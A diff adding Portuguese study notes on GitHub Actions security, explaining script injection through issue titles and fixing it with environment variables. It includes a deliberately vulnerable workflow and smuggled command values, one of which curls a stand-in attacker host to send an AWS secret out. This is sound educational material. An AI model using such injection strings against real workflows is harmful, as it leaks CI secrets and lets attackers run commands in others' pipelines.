@@ -1569,3 +1569,82 @@ if __name__ == '__main__':
 
 ```
 
+
+# Permissions & Security
+
+Pontos de atenção:
+- Script Injection 
+- Malicious Third-Party Actions
+- Permissions Issues
+
+Script Injection: Abertura ao receber input com script que possa manipular o Workflow
+
+Malicious Third-Party Actions: Actions de terceiros que podem ler algum secret ou agir de maneira não esperada que pode ser
+prejudicial ao repositório e infra-estrutura
+
+Permission Issues: Dar apenas permissões necessárias, como por exemplo, apenas read-only para quem não precisa manipular os
+Workflows.
+
+## Segurança em Workflows
+
+Exemplo de Script Injection:
+
+No exemplo a seguir, o Workflow é disparado através da abertura de uma Issue.
+Nota-se que o Step utiliza o título da Issue e isso dá abertura para injeção de scripts.
+
+```
+name: Label Issues (Script Injection Example)
+on:
+  issues:
+    types:
+      - opened
+jobs:
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        run: |
+          issue_title="${{ github.event.issue.title }}"
+          if [[ "$issue_title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+```
+
+Caso eu criasse uma Issue com o nome a"; echo Got your secrets", eu conseguiria executar
+esse comando echo, e é ai que mora o perigo, pois eu poderia fazer a leitura de alguma coisa que não é para ser lida
+ou fazer manipulações
+
+Outro exemplo de script malicioso:
+
+a"; curl http://my-bad-site.com?$SOME_AWS_SECRET  
+
+Um jeito de evitar que um comando shell seja injetado seria recebendo o nome da Issue em uma variável de ambiente,
+pois ao receber em uma variável, o Workflow vai interpretar o input como String e não como um comando.
+
+```
+name: Label Issues (Script Injection Example)
+on:
+  issues:
+    types:
+      - opened
+jobs:
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        env:
+          title: ${{ github.event.issue.title }}
+        run: |
+          if [[ "$title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
+```
+
+
+poderia ser feito uma requisição passando um dado secreto para um site terceiro.
+
+## Trabalhando com GitHub Tokens & Permissions
